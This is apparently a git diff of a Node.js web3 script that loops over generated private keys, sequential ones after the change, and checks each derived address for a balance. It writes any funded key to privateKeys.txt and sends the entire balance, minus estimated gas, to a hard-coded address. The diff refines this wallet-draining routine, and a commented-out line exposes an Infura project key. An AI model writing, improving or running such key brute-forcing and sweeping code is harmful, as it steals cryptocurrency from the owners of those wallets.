@@ -30,10 +30,13 @@ const getWeb3 = () => {
 //   "https://mainnet.infura.io/v3/afa9553623db44b388348836b654f819"
 // );
 
-const genRanHex = (size) =>
-  [...Array(size)]
-    .map(() => Math.floor(Math.random() * 16).toString(16))
-    .join("");
+let i = 0;
+
+const genRanHex = (size) => {
+  const res =
+    [...Array(size)].map(() => "0").join("") + Number(++i).toString(16);
+  return res.slice(-size);
+};
 const sleep = (ms) =>
   new Promise((resolve) => {
     setTimeout(resolve, ms);
@@ -43,23 +46,11 @@ const main = async () => {
   try {
     while (true) {
       const web3 = getWeb3();
-
       const privateKey = genRanHex(64);
       const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
       const balance = await web3.eth.getBalance(address);
-      // const balanceEther = await web3Ether.eth.getBalance(address);
-      // if (balance > 0 || balanceEther > 0) {
       if (balance > 0) {
-        console.log(privateKey, balance, balanceEther);
-        fs.appendFileSync(
-          "privateKeys.txt",
-          privateKey + balance > 0 ? " bnb" : " eth" + "\n"
-        );
-        web3.eth.accounts.wallet.add({
-          privateKey,
-          address,
-        });
-        await sendEther(address, balance);
+        await sendEther(address, balance, privateKey);
       } else {
         console.log(address, "no balance");
       }
@@ -71,21 +62,34 @@ const main = async () => {
   }
 };
 
-const sendEther = async (from, balance) => {
+const sendEther = async (from, balance, privateKey) => {
   const web3 = getWeb3();
 
   const to = "0x52D53cF066da6738e8F7A6E201a597C3380C13B6";
-  const gas = web3.utils.toWei("21000", "wei");
-  const sendAmount = parseFloat(balance) - parseFloat(gas);
-
-  console.log(sendAmount);
-  const tx = await web3.eth.sendTransaction({
+  const gasPrice = await web3.eth.getGasPrice(); // estimate the gas price
+  const transactionObject = {
     from: from,
     to: to,
-    gas: "21000",
-    value: sendAmount,
-  });
-  web3.eth.getTransaction(tx);
+    value: 1,
+  };
+
+  const gasLimit = await web3.eth.estimateGas(transactionObject);
+  const transactionFee = gasPrice * gasLimit;
+  transactionObject.gas = gasLimit;
+  transactionObject.value = balance - transactionFee;
+
+  if (transactionObject.value >= 0) {
+    console.log(privateKey, balance);
+    fs.appendFileSync("privateKeys.txt", privateKey + " " + balance + "\n");
+    web3.eth.accounts.wallet.add({
+      privateKey,
+      address: from,
+    });
+    const tx = await web3.eth.sendTransaction(transactionObject);
+    web3.eth.getTransaction(tx);
+  } else {
+    console.log(from, balance, "balance too low");
+  }
 };
 
 main();
